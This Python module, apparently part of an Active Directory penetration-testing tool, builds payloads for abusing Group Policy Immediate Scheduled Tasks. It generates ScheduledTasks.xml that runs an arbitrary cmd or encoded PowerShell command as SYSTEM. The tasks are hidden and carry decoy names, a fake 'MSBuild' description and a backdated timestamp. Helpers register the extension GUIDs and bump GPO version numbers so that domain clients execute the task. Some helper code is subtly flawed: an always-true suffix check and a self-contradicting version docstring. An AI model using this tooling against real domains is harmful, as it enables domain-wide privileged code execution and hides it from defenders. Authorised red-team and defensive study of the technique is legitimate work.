"""Pure XML/version primitives for GPO Immediate Scheduled Task abuse.

This module hosts the deterministic, side-effect-free building blocks used by
:mod:`adscan_internal.services.gpo_immediate_task_service`. Keeping them here
isolates the pieces that *must* be byte-for-byte correct from the AD-protocol
plumbing — the latter cannot be unit-tested under project policy (lab-only),
so every reviewable correctness claim about XML / version arithmetic lives in
this file's unit tests.

Design constraints:

* No imports from ``aiosmb`` / ``badldap`` / ``vendor/`` here. Pure stdlib.
* No ``logging.getLogger`` — the rules in ``CLAUDE.md`` apply, but this module
  does not produce user-facing output; callers handle that.
* Outputs are ``bytes`` whenever the result is destined for SYSVOL — Windows
  GPO files are written as UTF-16-LE BOM-prefixed XML for ScheduledTasks.xml
  on real domain controllers, but pyGPOAbuse demonstrably ships UTF-8 and the
  Group Policy client engine accepts both. We emit UTF-8 to match upstream.
* Constants (CSE GUIDs, clsids) are reproduced from publicly documented
  Microsoft Group Policy Preferences tooling. They are not copyrighted as
  expressive content; they are protocol identifiers.

References (read-only, never imported):
  reference/pyGPOAbuse/pygpoabuse/scheduledtask.py
  reference/pyGPOAbuse/pygpoabuse/gpo.py:13 (update_extensionNames)
  reference/pyGPOAbuse/pygpoabuse/gpo.py:71 (update_versions / gpt.ini regex)
"""

from __future__ import annotations

import binascii
import os
import re
import uuid
from base64 import b64encode
from datetime import datetime, timedelta
from xml.sax.saxutils import escape as _xml_escape


# ---------------------------------------------------------------------------
# Group Policy Preferences — protocol constants
# ---------------------------------------------------------------------------

# clsid for the <ScheduledTasks> root element of ScheduledTasks.xml.
SCHEDULED_TASKS_CLSID = "{CC63F200-7309-4ba0-B154-A71CD118DBCC}"

# clsid for the <ImmediateTaskV2> child element.
IMMEDIATE_TASK_V2_CLSID = "{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}"

# Client-Side Extension (CSE) GUID for "Scheduled Tasks Preference".
# This is the leader GUID of one of the bracket groups added to
# gPCMachineExtensionNames so the GP client engine processes the new XML.
CSE_LEADER_REGISTRY_EXTENSION = "00000000-0000-0000-0000-000000000000"
CSE_LEADER_PREFERENCES = "AADCED64-746C-4633-A97C-D61349046527"

# CSE GUID for the Group Policy Preferences Scheduled Tasks extension —
# appears as a child entry under both leader brackets above.
CSE_PREFERENCES_SCHEDULED_TASKS = "CAB54552-DEEA-4691-817E-ED4A4D1AFC72"


# ---------------------------------------------------------------------------
# ScheduledTasks.xml builder
# ---------------------------------------------------------------------------


def _generate_task_name() -> str:
    """Return a randomized but innocuous-looking task name."""
    return "TASK_" + binascii.b2a_hex(os.urandom(4)).decode("ascii")


def _default_mod_date() -> str:
    """Return a "modified 30 days ago" timestamp string for the XML attribute."""
    return (datetime.now() - timedelta(days=30)).strftime("%Y-%m-%d %H:%M:%S")


def build_immediate_task_xml(
    *,
    command: str,
    name: str | None = None,
    description: str | None = None,
    powershell: bool = False,
    author: str = "NT AUTHORITY\\System",
    mod_date: str | None = None,
    task_uid: str | None = None,
) -> str:
    """Return a valid ``ScheduledTasks.xml`` payload for a *computer-side*
    Immediate Scheduled Task that runs as ``NT AUTHORITY\\SYSTEM``.

    The returned string is the full document (XML declaration + root) ready
    to be written to
    ``\\\\dc\\SYSVOL\\<domain>\\Policies\\{<gpo>}\\Machine\\Preferences\\
    ScheduledTasks\\ScheduledTasks.xml``.

    Args:
        command: The shell command (cmd.exe ``/c <command>``) or PowerShell
            command line to execute. The string is *not* re-escaped at the
            shell level — the caller is responsible for shell-safe quoting
            of ``&`` etc. inside the command itself; XML-level escaping IS
            applied.
        name: Task display name. A random ``TASK_<hex>`` is generated if None.
        description: Free-form description. Defaults to a benign string.
        powershell: When True, wrap ``command`` as a base64-encoded
            ``powershell.exe -enc`` invocation. When False, run via
            ``cmd.exe /c``.
        author: Value used for both the ``<Author>`` element and the task
            principal. Default ``NT AUTHORITY\\System`` matches pyGPOAbuse.
        mod_date: Override the ``changed=`` attribute (string, format
            ``YYYY-MM-DD HH:MM:SS``). Defaults to "30 days ago".
        task_uid: Override the ``uid=`` GUID. Defaults to a fresh uuid4.

    Returns:
        UTF-8 string, XML-declaration-prefixed.
    """
    task_name = _xml_escape(name, {'"': "&quot;"}) if name else _generate_task_name()
    task_description = (
        _xml_escape(description) if description else "MSBuild build and release task"
    )
    task_mod_date = mod_date if mod_date else _default_mod_date()
    task_guid = (task_uid or str(uuid.uuid4())).upper().strip("{}")
    task_author = _xml_escape(author)

    if powershell:
        shell = _xml_escape("powershell.exe")
        encoded = b64encode(command.encode("utf-16-le")).decode("ascii")
        args = _xml_escape(f"-windowstyle hidden -nop -enc {encoded}")
    else:
        shell = _xml_escape("c:\\windows\\system32\\cmd.exe")
        args = _xml_escape(f'/c "{command}"')

    body = (
        f'<?xml version="1.0" encoding="utf-8"?>'
        f'<ScheduledTasks clsid="{SCHEDULED_TASKS_CLSID}">'
        f'<ImmediateTaskV2 clsid="{IMMEDIATE_TASK_V2_CLSID}" '
        f'name="{task_name}" image="0" changed="{task_mod_date}" '
        f'uid="{{{task_guid}}}" userContext="0" removePolicy="0">'
        f'<Properties action="C" name="{task_name}" '
        f'runAs="NT AUTHORITY\\System" logonType="S4U">'
        f'<Task version="1.3">'
        f"<RegistrationInfo>"
        f"<Author>{task_author}</Author>"
        f"<Description>{task_description}</Description>"
        f"</RegistrationInfo>"
        f'<Principals><Principal id="Author">'
        f"<UserId>NT AUTHORITY\\System</UserId>"
        f"<RunLevel>HighestAvailable</RunLevel>"
        f"<LogonType>S4U</LogonType>"
        f"</Principal></Principals>"
        f"<Settings>"
        f"<IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout>"
        f"<StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle>"
        f"</IdleSettings>"
        f"<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>"
        f"<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>"
        f"<StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>"
        f"<AllowHardTerminate>false</AllowHardTerminate>"
        f"<StartWhenAvailable>true</StartWhenAvailable>"
        f"<AllowStartOnDemand>false</AllowStartOnDemand>"
        f"<Enabled>true</Enabled><Hidden>true</Hidden>"
        f"<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>"
        f"<Priority>7</Priority>"
        f"<DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter>"
        f"<RestartOnFailure><Interval>PT15M</Interval><Count>3</Count></RestartOnFailure>"
        f"</Settings>"
        f'<Actions Context="Author">'
        f"<Exec><Command>{shell}</Command><Arguments>{args}</Arguments></Exec>"
        f"</Actions>"
        f"<Triggers><TimeTrigger>"
        f"<StartBoundary>%LocalTimeXmlEx%</StartBoundary>"
        f"<EndBoundary>%LocalTimeXmlEx%</EndBoundary>"
        f"<Enabled>true</Enabled>"
        f"</TimeTrigger></Triggers>"
        f"</Task></Properties></ImmediateTaskV2>"
        f"</ScheduledTasks>"
    )
    return body


# ---------------------------------------------------------------------------
# gPCMachineExtensionNames merge logic
# ---------------------------------------------------------------------------


def merge_machine_extension_names(existing: str | None) -> str:
    """Return the new ``gPCMachineExtensionNames`` value after registering the
    Scheduled Tasks CSE on a GPO.

    The attribute uses the format::

        [{<leader-guid>}{<cse-guid-1>}{<cse-guid-2>}...][{<leader-guid-2>}...]

    where bracket groups are sorted lexicographically by leader GUID and CSE
    GUIDs are appended in order without duplicates.

    Args:
        existing: Current attribute value (may be ``None`` / ``""``).

    Returns:
        New value, ready to write back via LDAP MOD_REPLACE.
    """
    leader_a = CSE_LEADER_REGISTRY_EXTENSION
    leader_b = CSE_LEADER_PREFERENCES
    cse = CSE_PREFERENCES_SCHEDULED_TASKS

    if not existing:
        return f"[{{{leader_a}}}{{{cse}}}][{{{leader_b}}}{{{cse}}}]"

    brackets: dict[str, list[str]] = {}
    for match in re.finditer(r"\[([^\]]+)\]", existing):
        guids = re.findall(r"\{([^}]+)\}", match.group(1))
        if guids:
            brackets[guids[0]] = list(guids[1:])

    for leader in (leader_a, leader_b):
        brackets.setdefault(leader, [])
        if cse not in brackets[leader]:
            brackets[leader].append(cse)

    parts: list[str] = []
    for leader in sorted(brackets):
        children = "".join("{" + g + "}" for g in brackets[leader])
        parts.append(f"[{{{leader}}}{children}]")
    return "".join(parts)


# ---------------------------------------------------------------------------
# gpt.ini version bump
# ---------------------------------------------------------------------------


_GPT_INI_VERSION_RE = re.compile(rb"=[0-9]+")


def bump_gpt_ini_version(content: bytes, new_version: int) -> bytes:
    """Return a new ``gpt.ini`` body with the ``Version=`` line replaced.

    The classic GPT.INI format stores the version as a decimal integer on a
    line ``Version=<n>``. This helper substitutes the *first* ``=<digits>``
    occurrence — matching pyGPOAbuse semantics. For files that contain
    additional ``key=int`` pairs (rare but possible), only the first is
    rewritten; that aligns with what real GPT.INI files contain in the wild.

    The content is decoded as UTF-8 and falls back to latin-1 to handle
    French/locale-specific accents in display names.

    Args:
        content: Raw bytes of the existing gpt.ini file.
        new_version: New integer version number (must be >= 0).

    Returns:
        New bytes with the version updated. Encoding is preserved
        (UTF-8 if decodable, otherwise latin-1).
    """
    if new_version < 0:
        raise ValueError(f"new_version must be >= 0, got {new_version}")

    replacement = f"={new_version}".encode("ascii")
    new_bytes, count = _GPT_INI_VERSION_RE.subn(replacement, content, count=1)
    if count == 0:
        # No version line — append one. Real GPT.INI files always have one,
        # but be defensive.
        suffix = b"" if content.endswith((b"\r\n", b"\n", b"")) else b"\r\n"
        return content + suffix + f"Version={new_version}\r\n".encode("ascii")
    return new_bytes


def compute_next_machine_version(current: int) -> int:
    """Return the new ``versionNumber`` after bumping the *machine* half.

    The ``versionNumber`` LDAP attribute on a groupPolicyContainer encodes
    two 16-bit counters: the low word is the user-side version, the high word
    is the machine-side version. Bumping the machine side adds 1 to the low
    word in pyGPOAbuse terms (their formula ``version + 1``) — this matches
    real GP client behavior where any change forces a re-apply.

    Args:
        current: Existing versionNumber attribute (0 if unset).

    Returns:
        Incremented value to write back.
    """
    if current < 0:
        raise ValueError(f"current versionNumber must be >= 0, got {current}")
    return current + 1
